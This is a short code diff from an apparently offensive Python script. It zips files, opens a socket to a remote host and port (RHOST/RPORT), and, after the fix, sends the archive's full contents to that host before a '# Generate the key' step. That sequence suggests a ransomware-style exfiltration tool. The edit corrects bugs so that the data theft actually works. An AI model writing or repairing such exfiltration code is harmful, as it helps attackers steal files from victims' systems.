@@ -26,9 +26,9 @@ with ZipFile(filename, "w") as zipped:
 # Send the files to a remote server
 s = socket.socket()
 s.connect((RHOST, RPORT))
-with open(file, "rb") as thefile:
+with open(filename, "rb") as thefile:
     thefile = thefile.read()
-    s.send(filename)
+    s.send(thefile)
     s.close()
 
 # Generate the key
